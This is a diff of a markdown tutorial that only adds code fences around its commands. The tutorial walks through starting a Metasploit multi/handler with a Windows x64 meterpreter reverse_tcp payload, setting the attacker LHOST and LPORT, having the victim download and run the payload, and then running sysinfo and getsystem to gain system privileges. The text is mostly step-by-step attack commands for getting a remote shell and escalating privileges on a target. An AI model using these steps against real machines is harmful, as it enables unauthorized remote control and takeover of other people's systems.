@@ -52,40 +52,52 @@ python3 -m http.server -b <your_machine_ip> <port_number>
 ### Step 1: 
 Go to new terminal and use the below command to start metasploit console 
 **Command**:
+```
 msfconsole  
-
+```
 ### Step 2: 
 Use the Multi Handler mood in metasploit. 
 **Command**: 
+```
 use exploit/multi/handler 
-
+```
 ### Step 3: 
 Set listening payload which is same as our msfvenom payload 
 **Command**: 
+```
 set payload payload/windows/x64/meterpreter/reverse_tcp 
-
+```
 ### Step 4: Now check the available options 
 **Command**: 
+```
 show options
-
+```
 ### Step 5: Local Host Setup 
 Now set the LHOST (attacker machine IP or interface) where the victim 
 machine will connect. 
 
 **Command**:
+```
 set lhost 192.168.0.7 
-
+```
 ### Step 6: now set the LHOST port (reverse connection port)  
 **Command**: 
+```
 set lport 4444 
+```
 Then use,  
 **Command**: 
+```
 exploit
-
+```
 ### Step 7: now download the file and run it .(dont do it earlier)
 
 ### Step 8: Now we will check the system info and the privileges we have gained. 
 **Command**: 
+```
 sysinfo 
+```
 **Command**: 
+```
 getsystem 
+```
